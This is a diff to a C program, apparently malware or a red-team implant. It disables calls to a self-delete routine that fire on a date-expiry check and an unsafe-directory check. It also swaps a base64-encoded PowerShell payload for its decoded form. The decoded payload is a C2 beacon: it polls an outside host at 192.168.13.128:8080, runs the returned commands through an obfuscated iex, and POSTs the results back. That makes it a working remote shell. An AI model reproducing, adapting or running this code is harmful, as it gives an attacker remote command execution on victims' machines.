@@ -28,7 +28,7 @@ void ct() {
         printf("Current date is later than the --th of --- month.\nPress Enter to continue...\n");
         char input[256];
         fgets(input, sizeof(input), stdin);
-        sd();
+        // sd();
         exit(1);
     } else {
         printf("Current date is before ----\n");
@@ -73,7 +73,7 @@ void sc() {
             printf("Running in the required directory.\n");
         } else {
             perror("Unsafe directory.\n");
-            sd();
+            // sd();
         }
     } else {
         printf("Could not determine the directory name.\n");
@@ -161,7 +161,7 @@ void sd() {
 }
 
 void oc() {
-    const char* command = "powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAzAC4AMQAyADgAOgA4ADAAOAAwACcAOwAkAGkAPQAnADYAOQA1ADgANgA1ADUAZQAtADYAZQBhAGMANwA2ADcAYQAtAGMAOQA5ADAAOAA0AGQANAAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA2ADkANQA4ADYANQA1AGUAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYwA0ADUAMAAtADkAOQBiADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgBlAGEAYwA3ADYANwBhACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGMANAA1ADAALQA5ADkAYgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpACcAJwBlACcAJwB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AYwA5ADkAMAA4ADQAZAA0ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYwA0ADUAMAAtADkAOQBiADQAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==";
+    const char* command = "$s='192.168.13.128:8080';$i='2a7b6d85-d814eec2-e416bc82';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/2a7b6d85 -Headers @{\"X-fc76-fd34\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/d814eec2 -Headers @{\"X-fc76-fd34\"=$i}).Content;if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e416bc82 -Method POST -Headers @{\"X-fc76-fd34\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} ";
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     
